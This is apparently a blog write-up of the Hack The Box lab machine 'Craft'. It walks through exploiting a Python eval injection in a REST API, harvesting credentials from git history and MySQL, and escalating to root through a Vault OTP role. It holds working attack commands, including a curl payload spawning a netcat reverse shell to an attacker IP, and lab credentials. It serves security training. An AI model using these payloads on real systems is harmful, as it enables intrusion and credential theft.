---
layout: single
title: Craft - Hack The Box
excerpt: "Craft was a fun Silicon Valley themed box where we have to exploit a vulnerable REST API eval function call to get RCE. After getting a shell on the app container, we escalate to a user shell on the host OS by finding credentials and SSH private keys. To gain root access, we have to generate an OTP token with the vault software installed on the machine."
date: 2020-01-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-craft/craft_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - gogs
  - api
  - git
  - vault
  - eval
  - python
---

![](/assets/images/htb-writeup-craft/craft_logo.png)

Craft was a fun Silicon Valley themed box where we have to exploit a vulnerable REST API eval function call to get RCE. After getting a shell on the app container, we escalate to a user shell on the host OS by finding credentials and SSH private keys. To gain root access, we have to generate an OTP token with the vault software installed on the machine.

## Summary

- Find the Gogs service, clone the app repo and identify the eval vulnerability in the source code
- Find a valid set of credentials in an old commit and use those to get a valid token for the API
- Exploit the eval vulnerability to get RCE and land a shell on the container
- Find Gilfoyle's Gogs password in the MySQL DB then find his SSH private key in the craft-infra repo
- Log in as gilfoyle on the host, find that vault is installed then generate an OTP to gain root access

## Portscan

I note that port 6022 is running a different SSH service: `SSH-2.0-Go`

```
# nmap -sC -sV -p- 10.10.10.110
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-14 09:02 EDT
Nmap scan report for craft.htb (10.10.10.110)
Host is up (0.018s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
6022/tcp open  ssh      (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
| ssh-hostkey:
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website enumeration

The main webpage shows that there is a REST API available so there's a good chance that this box will be about exploiting it.

![](/assets/images/htb-writeup-craft/craft.png)

- The link at the top right points to the API: `https://api.craft.htb/api/`. I'll add that domain to my local `/etc/hosts`.
- The icon next to the API link goes to the Gogs servers, which is a self-hosted service. Again, I will add another domain entry to my local host file: `gogs.craft.htb`.

## Gogs

Before I start messing with the API, I'll check the source code from the git repo for any leftover credentials, notes/comments and other pieces of information that could help me find a bug in the application.

![](/assets/images/htb-writeup-craft/gogs.png)

The first thing I check is the list of registered users, the organizations and the repos available:

![](/assets/images/htb-writeup-craft/gogs_users.png)

![](/assets/images/htb-writeup-craft/gogs_repos.png)

I tried fetching the repo with SSH but I got a permission denied, but I was able to get it with HTTPS:

```
# git clone ssh://git@gogs.craft.htb:6022/Craft/craft-api.git
Cloning into 'craft-api'...
The authenticity of host '[gogs.craft.htb]:6022 ([10.10.10.110]:6022)' can't be established.
RSA key fingerprint is SHA256:JL2e7zVkLrtwos3PHziXPRckBZRJ7BKPbuMuLpDn23s.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[gogs.craft.htb]:6022' (RSA) to the list of known hosts.
git@gogs.craft.htb: Permission denied (publickey).
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.

# env GIT_SSL_NO_VERIFY=true git clone https://gogs.craft.htb/Craft/craft-api.git
Cloning into 'craft-api'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (41/41), done.
remote: Total 45 (delta 10), reused 0 (delta 0)
Unpacking objects: 100% (45/45), done.
```

I then checked the commit logs to see what kind of changes were made.

```
# git log
commit e55e12d800248c6bddf731462d0150f6e53c0802 (HEAD -> master, origin/master, origin/HEAD)
Author: ebachman <ebachman@craft.htb>
Date:   Fri Feb 8 11:40:56 2019 -0500

    Add db connection test script

commit a2d28ed1554adddfcfb845879bfea09f976ab7c1
Author: dinesh <dinesh@craft.htb>
Date:   Wed Feb 6 23:18:51 2019 -0500

    Cleanup test

commit 10e3ba4f0a09c778d7cec673f28d410b73455a86
Author: dinesh <dinesh@craft.htb>
Date:   Wed Feb 6 23:12:07 2019 -0500

    add test script

commit c414b160578943acfe2e158e89409623f41da4c6
Author: dinesh <dinesh@craft.htb>
Date:   Wed Feb 6 22:01:25 2019 -0500

    Add fix for bogus ABV values

commit 4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95
Author: ebachman <ebachman@craft.htb>
Date:   Wed Feb 6 21:46:30 2019 -0500

    Add authentication to brew modify endpoints

commit 90fb3e8aa0ca9683bcc1ece8fc5bb15cb833a6ff
Author: ebachman <ebachman@craft.htb>
Date:   Wed Feb 6 21:41:42 2019 -0500

    Initialize git project
```

A fix was put in place by Dinesh to prevent ABV values from being submitted. When I check the list of issues on the Gogs site, I find one opened for that specific bug:

![](/assets/images/htb-writeup-craft/issues.png)

A couple of things pop out right away:
 - There's a JWT token in here (maybe there's no expiry set)
 - There's a link to commit `c414b16057` which contains the fix
 - Gilfoyle comments that this is a bad patch, there's probably a vulnerability in it

The token is not valid anymore:

`curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k https://api.craft.htb/api/auth/check`

`{"message": "Invalid token or no token found."}`

I use [https://jwt.io/](https://jwt.io/) to decode the token and see that the expiry is set to epoch time `1549385242` which is `Tuesday, February 5, 2019 4:47:22 PM` in human readable format.

![](/assets/images/htb-writeup-craft/jwt.png)

I'll try to bruteforce the shared secret on the token so I can forge my own and change the expiry:

```
# john -w=/usr/share/wordlists/rockyou.txt token
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 DONE (2019-07-14 21:07) 0g/s 2651Kp/s 2651Kc/s 2651KC/s !SkicA!..*7¡Vamos!
Session completed
```

Unfortunately the shared secret is not found in rockyou.txt, so it's probably not meant to be cracked to solve this box.

Next, I check the `brew.py` code and quickly spot the vulnerability:

![](/assets/images/htb-writeup-craft/eval.png)

Using eval with user controlled input is extremely dangerous and in this case I can use this to my advantage to gain remote code execution. But I need to first find a way to obtain a valid token so I can make API calls.

I look around the commits for other files and find that credentials were hardcoded in the `test.py`:

![](/assets/images/htb-writeup-craft/tests1.png)

![](/assets/images/htb-writeup-craft/tests2.png)

I got some credentials now: `dinesh / 4aUh0A8PbVJxgd`

I find the API documentation on the `https://api.craft.htb/api/` page:

![](/assets/images/htb-writeup-craft/apidoc.png)

To get a token, I'll do a GET to `/auth/login` and pass the credentials with HTTP basic auth:

`curl -H "Content-Type: application/json" --user dinesh:4aUh0A8PbVJxgd -k https://api.craft.htb/api/auth/login
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTUzODU2fQ.hs-9F_c_KXIHEQg4tmgaRWacmEC402tsgtolQPZB3ik"}`

The token is only valid for a short period of time so I'll use jq to parse the output and assign it to a variable and I use for my other curl requests:

`token=$(curl -s -H "Content-Type: application/json" --user dinesh:4aUh0A8PbVJxgd -k https://api.craft.htb/api/auth/login | jq -r .[])
echo $token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTU0MTAzfQ.JPg8sJ9enjgL86jy8DJrugK7xaF--wegrVdKXZLono0`

I can now do POST to add new brews:

`curl -k -H "Accept: application/json" -H "Content-Type: application/json" -H "X-Craft-API-Token: $token" https://api.craft.htb/api/brew/ -XPOST -d '{"id": 666, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "0.95"}'
null`

When doing a GET, I need to specify the page so I can confirm it's been added:

`curl -k "https://api.craft.htb/api/brew/?per_page=50&page=47"
 {"id": 2351, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "0.950"}, {"id": 2352, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "0.400"}], "page": 47, "pages": 47, "per_page": 50, "total": 2341}`

Ok, now it's time to exploit that eval to gain RCE. Because I don't see the results of the eval, I'll first test that the eval works by doing a `sleep` for 5 seconds:

`curl -k -H "Accept: application/json" -H "Content-Type: application/json" -H "X-Craft-API-Token: $token" https://api.craft.htb/api/brew/ -XPOST -d '{"id": 1000, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "__import__(\"time\").sleep(5)"}'`

Then after I confirmed that the eval works, I'll use `subprocess` to spawn a reverse shell:

`curl -k -H "Accept: application/json" -H "Content-Type: application/json" -H "X-Craft-API-Token: $token" https://api.craft.htb/api/brew/ -XPOST -d '{"id": 1000, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "__import__(\"subprocess\").check_output(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f\", shell=True) or 1"}'`

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.110] 43065
/bin/sh: can't access tty; job control turned off
/opt/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)...
/opt/app #
```

Turns out this is just a container and I need to keep looking to get a shell on the host OS.

## Finding more credentials in MySQL

The `settings.py` file contains the MySQL credentials and the shared api key.

```
/opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

The MySQL client is not installed on this machine but I can use the pymysql Python module to query the database.

```
/opt/app # python -c 'import pty;pty.spawn("/bin/sh")'
/opt/app # python
Python 3.6.8 (default, Feb  6 2019, 01:56:13) 
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pymysql
>>> connection = pymysql.connect(host='172.20.0.4', user='craft', password='qLGockJ6G2J75O',
    db='craft', cursorclass=pymysql.cursors.DictCursor)
>>> cursor = connection.cursor()
>>> cursor.execute("show tables")
2
>>> cursor.fetchall()
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
>>> cursor.execute("select * from user")
3
>>> cursor.fetchall()                   
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'},
 {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},
 {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

So I found a few more credentials:
 - `ebachman / llJ77D8QFkLPQB`
 - `gilfoyle / ZEU3N8WNM2rh4T`

I can log in to the Gogs website with Gilfoyle's credentials:

![](/assets/images/htb-writeup-craft/gogs_gilfoyle.png)

Gilfoyle has a private repo: `craft-infra` and I find Gilfoyle's SSH private and public keys in the `.ssh` directory:

![](/assets/images/htb-writeup-craft/gogs_ssh.png)

I can now log in as user `gilfoyle` with the SSH key (the SSH key password is ZEU3N8WNM2rh4T):

```
# ssh -i id_rsa gilfoyle@10.10.10.110


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa': 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gilfoyle@craft:~$ ls
user.txt
gilfoyle@craft:~$ cat user.txt
bbf4b0ca...
```

## Privesc

I saw from the `craft-infra` repo that Vault is installed and I see that Gilfoyle has a vault token in its home directory:

```
gilfoyle@craft:~$ ls -la
total 36
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9 22:46 .
drwxr-xr-x 3 root     root     4096 Feb  9 10:46 ..
-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9 22:41 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9 03:14 .config
-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8 21:52 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9 22:41 .ssh
-r-------- 1 gilfoyle gilfoyle   33 Feb  9 22:46 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Feb  9 00:26 .vault-token
-rw------- 1 gilfoyle gilfoyle 2546 Feb  9 22:38 .viminfo

gilfoyle@craft:~$ cat .vault-token
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```

The `secrets.sh` config in the repo contains the following:

```
vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

I can get an OTP user token for root and log in using `vault ssh -mode=otp -role=root_otp root@10.10.10.110`:

![](/assets/images/htb-writeup-craft/root.png)
